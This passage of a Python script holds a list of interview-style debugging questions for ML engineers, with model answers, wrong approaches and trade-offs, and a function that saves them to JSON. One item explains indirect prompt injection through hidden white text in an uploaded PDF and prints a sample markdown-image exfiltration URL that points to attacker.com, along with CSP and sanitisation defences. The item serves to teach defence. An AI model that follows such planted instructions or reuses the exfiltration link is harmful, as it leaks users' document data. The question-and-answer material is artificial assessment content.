            "Assuming fraud patterns changed dramatically within 48 hours and altering model architecture."
        ],
        [
            "debugging",
            "production-mlops"
        ],
        [
            "ai-data-engineer",
            "applied-ai-engineer"
        ],
        [
            "AS OF time-travel joins require maintaining versioned delta tables, increasing storage and compute costs for training pipelines.",
            "Online feature logging adds lightweight write overhead to Kafka but is essential for detecting skew."
        ],
        "senior"
    ],
    [
        "debug-kv-cache-fragmentation-cuda-oom",
        "An LLM serving node hosting an 8B model on an 80GB A100 crashed with CUDA out of memory during a traffic spike, even though monitoring showed total allocated KV cache tokens occupied only 58% of reserved GPU RAM. Why did it crash?",
        "A CUDA out of memory crash when KV cache tokens occupy only 58% of reserved VRAM reveals external memory fragmentation in the PyTorch memory pool. I would inspect the memory allocator configuration in PyTorch, compare allocated versus reserved GPU memory, and check whether non-paged tensor allocations fragmented the heap. We verify this by analyzing torch.cuda.memory_summary() after the crash, checking the ratio of largest free memory block to total unallocated memory. The root cause is that dynamic tensor allocations for intermediate logits and embeddings fragmented the PyTorch memory space, leaving plenty of total free memory but no single contiguous chunk large enough for a new memory allocation. The fix is configuring PyTorch with PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True to prevent virtual memory fragmentation, or moving KV cache entirely to pre-allocated PagedAttention blocks with fixed page sizes. We guard against memory crashes by setting serving memory headroom thresholds at 80% and load-testing concurrent batch limits in pre-release staging.",
        [
            "How does PagedAttention eliminate virtual memory fragmentation for KV caches?",
            "Why does activation memory scale quadratically with sequence length during full attention prefill?"
        ],
        [
            "Reducing max model context window to 2k tokens globally.",
            "Restarting the pod automatically every time it crashes without capping activation buffers."
        ],
        [
            "debugging",
            "gpu-memory-quantization"
        ],
        [
            "inference-engineer",
            "platform-engineer"
        ],
        [
            "Chunked prefill bounds activation memory and eliminates OOM crashes but introduces slight scheduling overhead for long prompts.",
            "Reserving 15% GPU headroom protects against activation spikes but reduces the maximum number of concurrent KV cache slots."
        ],
        "senior"
    ],
    [
        "debug-contrastive-loss-collapse-inbatch-negatives",
        "While training a dense passage retriever with in-batch negatives, contrastive loss dropped to 0.001 within 50 steps, and recall on the validation set fell to random chance. What is causing this loss collapse?",
        "Contrastive loss collapsing to near-zero within 50 steps while validation recall plummets indicates false negatives or an unnormalized representation space. I would examine batch composition in the DataLoader, check embedding vector normalization and temperature parameter scaling in InfoNCE loss, and inspect gradient magnitudes. We isolate this by checking cosine similarities between random pairs within the first batch and inspecting the temperature hyperparameter value. The root cause is that temperature was set to 0.001 instead of a standard 0.05 to 0.1 without L2 normalization, causing the softmax denominator to saturate immediately on trivial differences and collapsing gradients. The fix is setting temperature to 0.07, applying L2 normalization to all query and passage embeddings before computing dot products, and filtering duplicate passages from the batch to eliminate false negatives. We protect training runs by logging embedding norm distributions and monitoring validation recall at every checkpoint.",
        [
            "How does hard negative mining prevent contrastive models from learning trivial shortcut features?",
            "Why does an excessively small temperature parameter in InfoNCE destabilize training?"
        ],
        [
            "Switching from InfoNCE loss to mean squared error loss without fixing duplicate passages.",
            "Increasing the learning rate to escape the low-loss plateau."
        ],
        [
            "debugging",
            "deep-learning"
        ],
        [
            "applied-ai-engineer",
            "ai-data-engineer"
        ],
        [
            "Deduplicating passages across batches requires pre-clustering or memory-mapped lookups, slightly slowing data loader throughput.",
            "Hard negative mining increases retrieval quality but requires periodic index re-computation during training."
        ],
        "senior"
    ],
    [
        "debug-multimodal-markdown-image-exfiltration",
        "A multimodal document assistant that parses uploaded PDFs and renders summaries in Markdown was observed making unauthorized outbound HTTP GET requests to attacker-controlled domains containing sensitive document text. How is data being exfiltrated?",
        "Unauthorized outbound HTTP requests containing document text reveal a markdown image exfiltration attack via prompt injection. I would inspect the parsed PDF content for invisible prompt injection instructions, review markdown rendering sanitization in the client UI, and analyze outbound network traffic from the client. We isolate this by searching the PDF's text layer for hidden instructions like ![exfil](https://attacker.com/?data=...) and testing client-side HTML output rendering. The root cause is indirect prompt injection: a malicious document contained hidden white text directing the LLM to summarize sensitive findings and append them as URL query parameters in an image markdown tag, which the frontend rendered directly. The fix is sanitizing rendered Markdown using DOMPurify with image rendering restricted to trusted CDN domains, and implementing a strict Content Security Policy (img-src 'self' data:) that blocks third-party image fetches. We prevent exfiltration by running all document processing through input safety classifiers and enforcing outbound network restrictions in the frontend.",
        [
            "How does a Content Security Policy protect users against image-based data exfiltration?",
            "Why can't input sanitizers reliably detect all indirect prompt injections inside documents?"
        ],
        [
            "Asking the model in the prompt: 'Please do not render any external images.'",
            "Disabling markdown formatting entirely across the entire product."
        ],
        [
            "debugging",
            "safety"
        ],
        [
            "platform-engineer",
            "applied-ai-engineer"
        ],
        [
            "Enforcing strict CSP and stripping external images blocks exfiltration vectors but prevents users from displaying legitimate external graphs.",
            "Sandboxing render frames in separate origins isolates cookies and network context but complicates parent-child UI communication."
        ],
        "staff"
    ],
    [
        "debug-canary-rollout-healthcheck-timeout",
        "During a Canary deployment of a fine-tuned 14B model on Kubernetes, the Canary pod was repeatedly terminated by Kubernetes every 5 minutes, triggering continuous rollback loops. What is wrong with the probe configuration?",
        "A Canary pod restarting every 5 minutes during model rollout indicates an aggressive liveness probe failing during heavy GPU initialization. I would inspect the livenessProbe and readinessProbe configurations in the Kubernetes manifest, check GPU weight loading durations from object storage, and review pod event logs for OOMKills. We confirm this by running kubectl describe pod on the terminated Canary and observing whether Liveness probe failed: HTTP probe failed with statuscode: 503 is listed in the events. The root cause is that the liveness probe had an initialDelaySeconds of 30, but loading 14 billion parameters from S3 into GPU VRAM took 180 seconds, causing Kubernetes to mistake cold-start model initialization for a frozen pod. The fix is separating probes: configure a startupProbe with failureThreshold=30 and periodSeconds=10 to allow up to 300 seconds for initial model load, and point the liveness probe to a lightweight /healthz endpoint that checks serving availability only after startup succeeds. We guard against deployment loops by testing container cold-start loading times in staging and setting startup thresholds with 2x headroom.",
        [
            "What is the distinct role of a startupProbe versus a livenessProbe in Kubernetes for heavy ML workloads?",
            "How can you warm up CUDA kernels and PagedAttention tables before marking a pod ready?"
        ],
        [
            "Removing all health checks and liveness probes completely from production pods.",
            "Assuming the node has bad GPU hardware and switching instances."
        ],
        [
            "debugging",
            "production-mlops"
        ],
        [
            "platform-engineer",
            "inference-engineer"
        ],
        [
            "Adding a generous startup probe prevents premature kills but delays alerting if a container genuinely hangs on bad weights.",
            "Running warm-up inference queries ensures reliable first-token latency for users but adds 30 seconds to deployment time."
        ],
        "mid"
    ],
    [
        "debug-model-router-cascading-fallback-failure",
        "An automated model router that routes queries to an 8B model first and falls back to a 70B model on failure experienced a cascading outage: 95% of traffic shifted to the 70B model, exceeding cost budgets by 400% within 30 minutes. How do you triage this?",
        "A model router shifting 95% of traffic to a 70B fallback model and blowing cost budgets indicates an overly sensitive fallback circuit. I would examine the router's fallback trigger logic, analyze latency and error rates on the 8B primary cluster, and check downstream rate limiting. We diagnose this by analyzing gateway access logs to determine whether the 8B model was returning 5xx server errors, timeouts, or low confidence scores. The cause is that the router triggered a 70B fallback on single 8B timeouts during a minor traffic blip; the sudden influx of requests to the 70B cluster overwhelmed it, increasing latency and causing more fallbacks in a runaway feedback loop. The solution is implementing circuit breakers with exponential backoff: allow fallback only for explicit model errors (not timeouts), enforce a maximum concurrency cap on the 70B cluster, and return graceful degradations (like cached responses) rather than unbounded fallbacks. We prevent runaway spend by setting hard tenant budget caps and rate-limiting secondary model fallback allocations.",
        [
            "How does a token-bucket rate limiter on fallback routes prevent cost blowouts?",
            "Why should confidence-based routing use calibrated probabilities rather than raw token logprobs?"
        ],
        [
            "Setting the 8B timeout to 30 seconds to prevent fallbacks.",
            "Permanently removing the 70B fallback model and failing customer requests directly."
        ],
        [
            "debugging",
            "system-design"
        ],
        [
            "platform-engineer",
            "applied-ai-engineer"
        ],
        [
            "Capping fallback volume at 10% protects against budget blowouts but returns degraded responses to some users during outages.",
            "Circuit breakers decouple cascading failures but require tuning failure thresholds for bursty traffic."
        ],
        "staff"
    ],
    [
        "debug-ab-test-sample-ratio-mismatch",
        "In an online A/B test of a new hybrid search algorithm, traffic allocation was configured as 50/50, but after 100,000 sessions, the variant received 47,800 sessions and control received 52,200 (p-value < 0.0001). How do you debug this Sample Ratio Mismatch?",
        "A 47,800 versus 52,200 sample ratio mismatch on a 50/50 A/B test indicates differential user drop-off or biased bucket assignment. I would inspect the user hashing function across variant assignments, check for latency differences causing tracking failures before page load, and evaluate browser or device type distributions. We confirm this by computing chi-square test statistics on user demographic breakdowns (mobile vs desktop, connection speed) across control and variant buckets. The root cause is that the new search variant introduced a 450ms reranking latency regression, causing users on mobile connections to abandon the page before the client tracking beacon fired, systematically undercounting variant sessions. The fix is moving experiment bucketing and assignment logging server-side at the gateway before rendering, while addressing the 450ms latency bottleneck in the search pipeline. We protect future experiments by running automated daily SRM checks with chi-square tests and alerting immediately when allocation p-values fall below 0.01.",
        [
            "Why is an experiment's conversion rate metric mathematically untrustworthy when an SRM is present?",
            "How does server-side assignment logging eliminate front-end abandonment bias?"
        ],
        [
            "Ignoring the p-value because 48/52 looks close enough to 50/50.",
            "Adjusting traffic sliders manually during the test to force the numbers to match 50/50."
        ],
        [
            "debugging",
            "evaluation"
        ],
        [
            "ai-evaluation-reliability-engineer",
            "applied-ai-engineer"
        ],
        [
            "Server-side assignment logging accurately records all users but requires tracking infrastructure on the edge gateway.",
            "Halting an experiment on SRM detection delays product decisions but prevents shipping flawed or biased algorithms."
        ],
        "senior"
    ],
    [
        "debug-rag-chunk-boundary-truncation",
        "A customer service RAG bot answered 'No, refunds are not permitted' when an internal policy stated 'Refunds are permitted within 30 days of purchase for unused items'. Why did retrieval fail and how do you fix it?",
        "A RAG system asserting that refunds are not permitted when policy allows them within 30 days indicates semantic fracture across arbitrary chunk boundaries. I would inspect the chunking configuration and split boundaries, examine the top-k passages retrieved for this query, and check chunk overlap settings. We diagnose this by pulling the exact text chunks passed into the RAG generation prompt and searching the vector database for the omitted qualifying text. The root cause is fixed-token chunking without sentence boundary awareness: the chunker split the text directly after 'No,' on token 512, placing the condition 'Refunds are permitted within 30 days...' into the next chunk, which failed to make the top-k retrieval cutoff. The fix is migrating to sentence-aware recursive chunking with at least 80 tokens of overlap (chunk_size=400, chunk_overlap=80), and implementing parent-document retrieval so retrieved chunks expand to their enclosing section. We prevent this by adding negative assertion test suites to CI to verify that conditional clauses and exceptions remain attached to their qualifying statements.",
        [
            "How does parent-document retrieval solve the trade-off between small embedding chunks and large context windows?",
            "Why does fixed-character chunking degrade accuracy on legal and policy documentation?"
        ],
        [
            "Prompting the model to 'always assume refunds are allowed unless certain'.",
            "Increasing top-k from 5 to 50, which fills the prompt with irrelevant noise."
        ],
        [
            "debugging",
            "rag"
        ],
        [
            "applied-ai-engineer",
            "ai-data-engineer"
        ],
        [
            "Sentence-aware chunking with overlap prevents truncated clauses but increases total vector index size by 20-30%.",
            "Parent-document retrieval guarantees complete semantic context but consumes more LLM context window tokens."
        ],
        "mid"
    ],
    [
        "debug-lora-svd-gradient-vanishing",
        "A LoRA fine-tuning run on a 70B model with rank r=64 and scaling factor alpha=8 shows loss flatlining from epoch 1, with zero reduction in training loss. Why is the adapter not learning?",
        "Loss completely flatlining from epoch 1 with rank r=64 and alpha=8 indicates severe gradient under-scaling in the adapter updates. I would inspect the effective LoRA scaling factor alpha / r, check adapter weight initialization (Matrix A Gaussian, Matrix B zero), and verify learning rate parameter groups. We diagnose this by calculating the scaling ratio alpha / r = 8 / 64 = 0.125, which shrinks adapter gradients by an 8x factor, and logging gradient norms across initial steps. The root cause is mismatched alpha and rank: setting alpha=8 with r=64 attenuated gradient updates so heavily that the effective learning rate was insufficient to move weights away from initialization. The fix is setting alpha=64 or alpha=128 (maintaining alpha / r >= 1.0), or proportionally raising the learning rate for adapter parameters. We prevent this by adding configuration validation in training scripts that asserts alpha >= r and logs effective scaling factors before training begins.",
        [
            "What is the mathematical role of alpha in LoRA weight updates (W = W_0 + (alpha / r) * B * A)?",
            "Why is matrix B initialized to zero while matrix A is initialized with random Gaussian values?"
        ],
        [
            "Unfreezing all 70B parameters and training full weights on a single node.",
            "Decreasing rank to r=1 without adjusting alpha."
        ],
        [
            "debugging",
            "post-training"
        ],
        [
            "applied-ai-engineer",
            "platform-engineer"
        ],
        [
            "Setting alpha=r maintains stable learning rate scaling when experimenting across different rank values.",
            "Higher rank provides greater expressiveness for complex tasks but increases checkpoint storage and training VRAM."
        ],
        "senior"
    ],
    [
        "debug-agent-async-tool-race-condition",
        "An autonomous travel planning agent occasionally books duplicate hotel rooms and outputs conflicting itineraries when executing concurrent tool calls. How do you identify and eliminate this race condition?",
        "An agent creating duplicate hotel bookings during concurrent tool execution is the hallmark of an uncoordinated state race condition. I would inspect the concurrency model for tool dispatch and state updates, check transaction isolation levels on conversation memory, and analyze trace timestamps on tool resolution. We isolate this by logging dispatch and completion timestamps in OpenTelemetry traces and replaying the execution with forced sequential tool calls. The root cause is a read-modify-write race: search_flight and book_hotel executed concurrently; when book_hotel finished, it updated conversation state without a mutex, overwriting concurrent state and causing the agent to re-trigger booking on the next reasoning step. The fix is enforcing idempotency keys on all state-mutating actions, locking state updates with transactional mutexes, and executing state-mutating tools sequentially while keeping read-only tools concurrent. We prevent race conditions by requiring idempotency tokens on all transactional tool interfaces and running concurrent stress tests in the agent evaluation harness.",
        [
            "How do idempotency keys prevent duplicate actions in distributed agent systems?",
            "Why should state-mutating tools execute sequentially while read tools run in parallel?"
        ],
        [
            "Adding a time.sleep(2) between tool calls hoping the race condition disappears.",
            "Relying on the LLM to remember which tools have finished executing."
        ],
        [
            "debugging",
            "agents"
        ],
        [
            "agentic-ai-engineer",
            "platform-engineer"
        ],
        [
            "Requiring idempotency keys and sequential execution for stateful tools prevents duplicate mutations but increases total agent step latency.",
            "Append-only event sourcing provides perfect auditability and race immunity but requires event fold logic on state reconstruction."
        ],
        "staff"
    ]
]


def main():
    data = json.loads(SENIOR_FILE.read_text())
    data["debug"] = DEBUG_QUESTIONS
    SENIOR_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n")
    print(f"Successfully wrote {len(DEBUG_QUESTIONS)} questions to {SENIOR_FILE} under 'debug'")


if __name__ == "__main__":
    main()
